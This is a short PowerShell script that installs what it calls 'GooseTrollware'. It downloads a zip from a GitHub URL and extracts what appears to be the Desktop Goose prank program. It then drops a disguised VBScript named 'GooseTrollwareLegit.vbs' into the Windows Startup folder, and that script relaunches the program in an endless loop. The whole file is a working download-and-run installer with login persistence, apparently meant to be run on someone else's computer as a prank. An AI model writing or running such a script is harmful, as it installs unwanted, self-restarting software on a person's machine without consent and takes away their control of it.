# Download and install
Set-Location $home
Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G/raw/main/g.zip" -OutFile "GooseTrollware.zip" -Force
Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force

# Copy VBA script to startup folder
$gloc="$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.vbs"
@"
Do
    Set objShell = CreateObject("WScript.Shell")
    strHomeDir = objShell.ExpandEnvironmentStrings("%userprofile%")
    strExePath = strHomeDir & "\GooseTrollware\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
    Do
        objShell.Run Chr(34) & strExePath & Chr(34), 1, True
        Exit Do
        WScript.Sleep 5000
    Loop
Loop
"@ > $gloc

# And finally we start it
Start-Sleep 1
Start-Process $gloc
